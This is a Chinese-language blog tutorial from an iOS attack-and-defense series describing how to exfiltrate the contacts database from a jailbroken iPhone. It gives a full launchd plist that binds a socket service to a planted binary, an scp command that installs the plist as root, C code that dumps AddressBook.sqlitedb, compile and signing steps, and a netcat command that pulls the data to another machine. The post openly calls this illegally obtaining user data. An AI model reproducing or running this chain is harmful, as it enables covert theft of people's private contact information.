title: iOS攻防——（二）如何窃取用户的通讯录信息
date: 2016-07-12 21:31:24
tags:
  - iOS
  - iOS攻防
categories:
  - iOS
  - iOS攻防
---

# 说明
2016年7月15更新，最近试了一下，发现用nc拿不到数据了，拿数据的代码是没有问题的，直接运行可以拿到数据，但是从mac通过IP和端口拿到的.sqlitedb文件是空文件，博主也正在看为什么~大家有兴趣可以一起找一下原因。

# 简介
本文章基于念茜的iOS攻防系列。
本文将会讲解如何窃取用户的通讯录信息。
同样在越狱手机环境下。

# hack
## 1. 需要一个plist
需要这样一个plist，它看起来是这样：

![](http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png)

<!--more-->

源文件是这样：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Program</key>
	<string>/usr/bin/hack</string>
	<key>StandardErrorPath</key>
	<string>/dev/null</string>
	<key>SessionCreate</key>
	<true/>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/hack</string>
	</array>
	<key>inetdCompatibility</key>
	<dict>
		<key>Wait</key>
		<false/>
	</dict>
	<key>Sockets</key>
	<dict>
		<key>Listeners</key>
		<dict>
			<key>SockServiceName</key>
			<string>55</string>
		</dict>
	</dict>
</dict>
</plist>

```

SockServiceName指的是通信名称
将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下 

```
scp /Users/zhoulingyu/Desktop/hack.plist root@192.168.31.152:/System/Library/LaunchDaemons/hack.plist
```



## 2. 了解一下OS X的启动原理

> 1. mac固件激活，初始化硬件，加载BootX引导器。
> 2. BootX加载内核与内核扩展(kext)。
> 3. 内核启动launchd进程。
> 4. launchd根据/System/Library/LaunchAgents、/System/Library/LaunchDaemons、/Library/LaunchDaemons、Library/LaunchAgents、~/Library/LaunchAgents里的plist配置，启动服务守护进程

解释一下：
> LaunchDaemons是用户未登陆前就启动的服务（守护进程）
> LaunchAgents是用户登陆后启动的服务（守护进程）

几个目录下plist文件格式及每个字段的含义：

| Key | Description | Required
| :-------------: | :------------- | :-----: |
| Label | The name of the job | yes |
| ProgramArguments | Strings to pass to the program when it is executed | yes |
| UserName | The job will be run as the given user, who may not necessarily be the one who submitted it to launchd. | no |
| inetdCompatibility | Indicates that the daemon expects to be run as if it were launched by inetd | no |
| Program | The path to your executable. This key can save the ProgramArguments key for flags and arguments. | no |
| onDemand | A boolean flag that defines if a job runs continuously or not | no |
| RootDirectory | The job will be?chrooted?into another directory | no |
| ServiceIPC | Whether the daemon can speak IPC to launchd | no |
| WatchPaths | Allows launchd to start a job based on modifications at a file-system path | no |
| QueueDirectories | Similar to WatchPath, a queue will only watch an empty directory for new files | no |
| StartInterval | Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs. | no |
| StartCalendarInterval | Job scheduling. The syntax is similar to cron. | no |
| HardResourceLimits | Controls restriction of the resources consumed by any job | no |
| LowPriorityIO | Tells the kernel that this task is of a low priority when doing file system I/O | no |
| Sockets | An array can be used to specify what socket the daemon will listen on for launch on demand | no |

iOS基本类似，我基本是参照这个来的。

所以上面的plist实际上是要求系统启动一个进程。
一个名为`hack`的进程，可执行文件的路径是/usr/bin/hack。

## 3. 编写读取通讯录数据程序
iTunes Store的数据都在`/var/mobile/Library/AddressBook/AddressBook.sqlitedb`中，只要能能拿出AddressBook.sqlitedb就可以非法拿到用户的数据。


那么现在编写一个程序：

```c
#include <stdio.h>   
#include <fcntl.h>   
#include <stdlib.h>   
   
#define FILE "/var/mobile/Library/AddressBook/AddressBook.sqlitedb"   
   
int main(){   
    int fd = open(FILE, O_RDONLY);   
    char buf[128];   
    int ret = 0;   
       
    if(fd < 0)   
        return -1;   
    while (( ret = read(fd, buf, sizeof(buf))) > 0){   
        write( fileno(stdout), buf, ret);   
    }   
    close(fd);   
    return 0;   
}  
```

用同样的方法编译、传输：

```
xcrun -sdk iphoneos clang -arch armv7 -o hack hack.c
```

签名：

```
ldid -S hack
mv hack /usr/bin
```

## 4. 抓取 iTunesstore 数据信息
利用netcat，指定之前定义的服务名称，抓取设备 iTunesstore 信息：

```
nc 192.168.31.152 55 > itunesstored2.sqlitedb
```

OK，在MAC查看一下内容。


----

有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <coderfish@163.com>。

博主是 iOS 妹子一枚。

希望大家一起进步。

我的微博：[小鱼周凌宇](http://weibo.com/coderfish/)


